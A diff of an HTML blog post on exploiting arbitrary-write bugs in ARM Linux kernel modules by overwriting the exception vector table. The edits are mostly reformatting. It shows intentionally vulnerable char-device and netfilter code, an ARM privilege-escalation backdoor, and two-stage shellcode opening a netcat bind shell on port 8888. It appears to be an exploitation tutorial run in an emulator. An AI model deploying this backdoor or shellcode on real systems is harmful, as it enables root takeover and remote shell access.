@@ -195,24 +195,24 @@
 <p>There are few vectors we could use in order to obtain privileged code execution. Clearly, overwriting any vector in the table could potentially lead to code execution, but as the lazy people that we are, let's try to do the least amount of work. The easiest one to overwrite seems to be the Software Interrupt vector. It is executing in process context, system calls go through there, all is well. Let's now go through some PoCs/examples. All the following examples have been tested on Debian 7 ARMel 3.2.0-4-versatile running in qemu.</p>
 <h2 id="local-scenario">Local scenario</h2>
 <p>The example vulnerable module implements a char device that has a pretty blatant arbitrary-write vulnerability( or is it a feature?):</p>
-<div class="highlight"><pre><span></span><span class="c1">// called when &#39;write&#39; system call is done on the device file</span>
-<span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">on_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span><span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="kt">size_t</span> <span class="n">siz</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
-    <span class="kt">void</span> <span class="o">*</span> <span class="n">where</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="kt">char</span> <span class="o">*</span> <span class="n">what</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<div class="highlight"><pre><span></span>    <span class="c1">// called when &#39;write&#39; system call is done on the device file</span>
+    <span class="k">static</span> <span class="kt">ssize_t</span> <span class="nf">on_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span><span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="kt">size_t</span> <span class="n">siz</span> <span class="o">=</span> <span class="n">len</span><span class="p">;</span>
+        <span class="kt">void</span> <span class="o">*</span> <span class="n">where</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+        <span class="kt">char</span> <span class="o">*</span> <span class="n">what</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
 
-    <span class="k">if</span><span class="p">(</span><span class="n">siz</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">))</span>
-        <span class="n">what</span> <span class="o">=</span> <span class="n">buff</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">);</span>
-    <span class="k">else</span>
-        <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">siz</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">))</span>
+            <span class="n">what</span> <span class="o">=</span> <span class="n">buff</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">);</span>
+        <span class="k">else</span>
+            <span class="k">goto</span> <span class="n">end</span><span class="p">;</span>
 
-    <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">where</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">));</span>
-    <span class="n">memcpy</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">));</span>
+        <span class="n">copy_from_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">where</span><span class="p">,</span> <span class="n">buff</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">));</span>
+        <span class="n">memcpy</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">));</span>
 
-<span class="nl">end</span><span class="p">:</span>
-    <span class="k">return</span> <span class="n">siz</span><span class="p">;</span>
-<span class="p">}</span>
+    <span class="nl">end</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">siz</span><span class="p">;</span>
+    <span class="p">}</span>
 </pre></div>
 
 
@@ -228,24 +228,24 @@ It looks like nothing is there so we have around 480 bytes to store our backdoor
     2. Overwrite the SWI exception vector with a branch to <em>0xffff0020</em>.<br>
     3. When a system call occurs, our backdoor will check if r7 == 0xb0000000 and if true, elevate the privileges of the calling process otherwise jump to the normal system call handler.<br>
 Here is the backdoor's code:</p>
-<div class="highlight"><pre><span></span><span class="c1">;check if magic</span>
-    <span class="nf">cmp</span>     <span class="nv">r7</span><span class="p">,</span> <span class="err">#</span><span class="mh">0xb0000000</span>
-    <span class="nf">bne</span>     <span class="nv">exit</span>
+<div class="highlight"><pre><span></span>    ;check if magic
+        cmp     r7, #0xb0000000
+        bne     exit
 
-<span class="nl">elevate:</span>
-    <span class="nf">stmfd</span>   <span class="nb">sp</span><span class="err">!</span><span class="p">,</span><span class="err">{</span><span class="nv">r0</span><span class="o">-</span><span class="nv">r12</span><span class="err">}</span>
+    elevate:
+        stmfd   sp!,{r0-r12}
 
-    <span class="nf">mov</span>     <span class="nv">r0</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
-    <span class="nf">ldr</span>     <span class="nv">r3</span><span class="p">,</span> <span class="err">=</span><span class="mh">0xc0049a00</span>     <span class="c1">;prepare_kernel_cred</span>
-    <span class="nf">blx</span>     <span class="nv">r3</span>
-    <span class="nf">ldr</span>     <span class="nv">r4</span><span class="p">,</span> <span class="err">=</span><span class="mh">0xc0049438</span>     <span class="c1">;commit_creds</span>
-    <span class="nf">blx</span>     <span class="nv">r4</span>
+        mov     r0, #0
+        ldr     r3, =0xc0049a00     ;prepare_kernel_cred
+        blx     r3
+        ldr     r4, =0xc0049438     ;commit_creds
+        blx     r4
 
-    <span class="nf">ldmfd</span>   <span class="nb">sp</span><span class="err">!</span><span class="p">,</span> <span class="err">{</span><span class="nv">r0</span><span class="o">-</span><span class="nv">r12</span><span class="p">,</span> <span class="nv">pc</span><span class="err">}</span><span class="o">^</span>  <span class="c1">;return to userland</span>
+        ldmfd   sp!, {r0-r12, pc}^  ;return to userland
 
-<span class="c1">;go to syscall handler</span>
-<span class="nl">exit:</span>
-    <span class="nf">ldr</span>     <span class="nv">pc</span><span class="p">,</span> <span class="p">[</span><span class="nv">pc</span><span class="p">,</span> <span class="err">#</span><span class="mi">980</span><span class="p">]</span>      <span class="c1">;go to normal swi handler</span>
+    ;go to syscall handler
+    exit:
+        ldr     pc, [pc, #980]      ;go to normal swi handler
 </pre></div>
 
 
@@ -253,17 +253,17 @@ Here is the backdoor's code:</p>
 <center><img alt="Local PoC" src="/images/corrupting_arm_evt/local_poc.png"></center>  </p>
 <h2 id="remote-scenario">Remote scenario</h2>
 <p>For this example, we will use a netfilter module with a similar vulnerability as the previous one:</p>
-<div class="highlight"><pre><span></span>    <span class="k">if</span><span class="p">(</span><span class="n">ip</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">protocol</span> <span class="o">==</span> <span class="n">IPPROTO_TCP</span><span class="p">){</span>
-        <span class="n">tcp</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="p">)(</span><span class="n">skb_network_header</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span> <span class="o">+</span> <span class="n">ip_hdrlen</span><span class="p">(</span><span class="n">skb</span><span class="p">));</span>
-        <span class="n">currport</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">tcp</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">dest</span><span class="p">);</span>
-        <span class="k">if</span><span class="p">((</span><span class="n">currport</span> <span class="o">==</span> <span class="mi">9999</span><span class="p">)){</span>
-            <span class="n">tcp_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">tcp</span> <span class="o">+</span> <span class="p">(</span><span class="n">tcp</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">doff</span> <span class="o">*</span> <span class="mi">4</span><span class="p">));</span>
-            <span class="n">where</span> <span class="o">=</span> <span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">tcp_data</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
-            <span class="n">len</span> <span class="o">=</span> <span class="p">((</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">tcp_data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">)))[</span><span class="mi">0</span><span class="p">];</span>
-            <span class="n">what</span> <span class="o">=</span> <span class="n">tcp_data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
-            <span class="n">memcpy</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
+<div class="highlight"><pre><span></span>        <span class="k">if</span><span class="p">(</span><span class="n">ip</span><span class="o">-&gt;</span><span class="n">protocol</span> <span class="o">==</span> <span class="n">IPPROTO_TCP</span><span class="p">){</span>
+            <span class="n">tcp</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">tcphdr</span> <span class="o">*</span><span class="p">)(</span><span class="n">skb_network_header</span><span class="p">(</span><span class="n">skb</span><span class="p">)</span> <span class="o">+</span> <span class="n">ip_hdrlen</span><span class="p">(</span><span class="n">skb</span><span class="p">));</span>
+            <span class="n">currport</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">tcp</span><span class="o">-&gt;</span><span class="n">dest</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">((</span><span class="n">currport</span> <span class="o">==</span> <span class="mi">9999</span><span class="p">)){</span>
+                <span class="n">tcp_data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">tcp</span> <span class="o">+</span> <span class="p">(</span><span class="n">tcp</span><span class="o">-&gt;</span><span class="n">doff</span> <span class="o">*</span> <span class="mi">4</span><span class="p">));</span>
+                <span class="n">where</span> <span class="o">=</span> <span class="p">((</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="n">tcp_data</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
+                <span class="n">len</span> <span class="o">=</span> <span class="p">((</span><span class="kt">uint8_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">tcp_data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">)))[</span><span class="mi">0</span><span class="p">];</span>
+                <span class="n">what</span> <span class="o">=</span> <span class="n">tcp_data</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">where</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
+                <span class="n">memcpy</span><span class="p">(</span><span class="n">where</span><span class="p">,</span> <span class="n">what</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
+            <span class="p">}</span>
         <span class="p">}</span>
-    <span class="p">}</span>
 </pre></div>
 
 
@@ -278,48 +278,48 @@ Every system call goes through the SWI vector so we won't have to wait too much 
     3. When a system call occurs, our first stage shellcode will set the link register to the address of our second stage shellcode (which is also stored in the EVT and which will be executed from userland), and then return to userland.<br>
     4. The calling process will "resume execution" at the address of our second stage which is just a bind shell.  </p>
 <p>Here is the stage 1-2 shellcode:</p>
-<div class="highlight"><pre><span></span><span class="nl">stage_1:</span>
-    <span class="nf">adr</span>     <span class="nv">lr</span><span class="p">,</span> <span class="nv">stage_2</span>
-    <span class="nf">push</span>    <span class="err">{</span><span class="nv">lr</span><span class="err">}</span>
-    <span class="nf">stmfd</span>   <span class="nb">sp</span><span class="err">!</span><span class="p">,</span> <span class="err">{</span><span class="nv">r0</span><span class="o">-</span><span class="nv">r12</span><span class="err">}</span>
-    <span class="nf">ldr</span>     <span class="nv">r0</span><span class="p">,</span> <span class="err">=</span><span class="mh">0xe59ff410</span>     <span class="c1">; intial value at 0xffff0008 which is</span>
-                                <span class="c1">; ldr     pc, [pc, #1040] ; 0xffff0420</span>
-    <span class="nf">ldr</span>     <span class="nv">r1</span><span class="p">,</span> <span class="err">=</span><span class="mh">0xffff0008</span>
-    <span class="nf">str</span>     <span class="nv">r0</span><span class="p">,</span> <span class="p">[</span><span class="nv">r1</span><span class="p">]</span>
-    <span class="nf">ldmfd</span>   <span class="nb">sp</span><span class="err">!</span><span class="p">,</span> <span class="err">{</span><span class="nv">r0</span><span class="o">-</span><span class="nv">r12</span><span class="p">,</span> <span class="nv">pc</span><span class="err">}</span><span class="o">^</span>  <span class="c1">; return to userland</span>
+<div class="highlight"><pre><span></span>    stage_1:
+        adr     lr, stage_2
+        push    {lr}
+        stmfd   sp!, {r0-r12}
+        ldr     r0, =0xe59ff410     ; intial value at 0xffff0008 which is
+                                    ; ldr     pc, [pc, #1040] ; 0xffff0420
+        ldr     r1, =0xffff0008
+        str     r0, [r1]
+        ldmfd   sp!, {r0-r12, pc}^  ; return to userland
 
-<span class="nl">stage_2:</span>
-    <span class="nf">ldr</span>     <span class="nv">r0</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x6e69622f</span>     <span class="c1">; /bin</span>
-    <span class="nf">ldr</span>     <span class="nv">r1</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x68732f2f</span>     <span class="c1">; /sh</span>
-    <span class="nf">eor</span>     <span class="nv">r2</span><span class="p">,</span> <span class="nv">r2</span><span class="p">,</span> <span class="nv">r2</span>          <span class="c1">; 0x00000000</span>
-    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r0</span><span class="p">,</span> <span class="nv">r1</span><span class="p">,</span> <span class="nv">r2</span><span class="err">}</span>
-    <span class="nf">mov</span>     <span class="nv">r0</span><span class="p">,</span> <span class="nb">sp</span>
+    stage_2:
+        ldr     r0, =0x6e69622f     ; /bin
+        ldr     r1, =0x68732f2f     ; /sh
+        eor     r2, r2, r2          ; 0x00000000
+        push    {r0, r1, r2}
+        mov     r0, sp
 
-    <span class="nf">ldr</span>     <span class="nv">r4</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x0000632d</span>     <span class="c1">; -c\x00\x00</span>
-    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r4</span><span class="err">}</span>
-    <span class="nf">mov</span>     <span class="nv">r4</span><span class="p">,</span> <span class="nb">sp</span>
+        ldr     r4, =0x0000632d     ; -c\x00\x00
+        push    {r4}
+        mov     r4, sp
 
-    <span class="nf">ldr</span>     <span class="nv">r5</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x2d20636e</span>
-    <span class="nf">ldr</span>     <span class="nv">r6</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x3820706c</span>
-    <span class="nf">ldr</span>     <span class="nv">r7</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x20383838</span>     <span class="c1">; nc -lp 8888 -e /bin//sh</span>
-    <span class="nf">ldr</span>     <span class="nv">r8</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x2f20652d</span>
-    <span class="nf">ldr</span>     <span class="nv">r9</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x2f6e6962</span>
-    <span class="nf">ldr</span>     <span class="nv">r10</span><span class="p">,</span> <span class="err">=</span><span class="mh">0x68732f2f</span>
+        ldr     r5, =0x2d20636e
+        ldr     r6, =0x3820706c
+        ldr     r7, =0x20383838     ; nc -lp 8888 -e /bin//sh
+        ldr     r8, =0x2f20652d
+        ldr     r9, =0x2f6e6962
+        ldr     r10, =0x68732f2f
 
-    <span class="nf">eor</span>     <span class="nv">r11</span><span class="p">,</span> <span class="nv">r11</span><span class="p">,</span> <span class="nv">r11</span>
-    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r5</span><span class="o">-</span><span class="nv">r11</span><span class="err">}</span>
-    <span class="nf">mov</span>     <span class="nv">r5</span><span class="p">,</span> <span class="nb">sp</span>
-    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r2</span><span class="err">}</span>
+        eor     r11, r11, r11
+        push    {r5-r11}
+        mov     r5, sp
+        push    {r2}
 
-    <span class="nf">eor</span>     <span class="nv">r6</span><span class="p">,</span> <span class="nv">r6</span><span class="p">,</span> <span class="nv">r6</span>
-    <span class="nf">push</span>    <span class="err">{</span><span class="nv">r0</span><span class="p">,</span><span class="nv">r4</span><span class="p">,</span><span class="nv">r5</span><span class="p">,</span> <span class="nv">r6</span><span class="err">}</span>
-    <span class="nf">mov</span>     <span class="nv">r1</span><span class="p">,</span> <span class="nb">sp</span>
-    <span class="nf">mov</span>     <span class="nv">r7</span><span class="p">,</span> <span class="err">#</span><span class="mi">11</span>
-    <span class="nf">swi</span>     <span class="mh">0x0</span>
+        eor     r6, r6, r6
+        push    {r0,r4,r5, r6}
+        mov     r1, sp
+        mov     r7, #11
+        swi     0x0
 
-    <span class="nf">mov</span>     <span class="nv">r0</span><span class="p">,</span> <span class="err">#</span><span class="mi">99</span>
-    <span class="nf">mov</span>     <span class="nv">r7</span><span class="p">,</span> <span class="err">#</span><span class="mi">1</span>
-    <span class="nf">swi</span>     <span class="mh">0x0</span>
+        mov     r0, #99
+        mov     r7, #1
+        swi     0x0
 </pre></div>
 
 
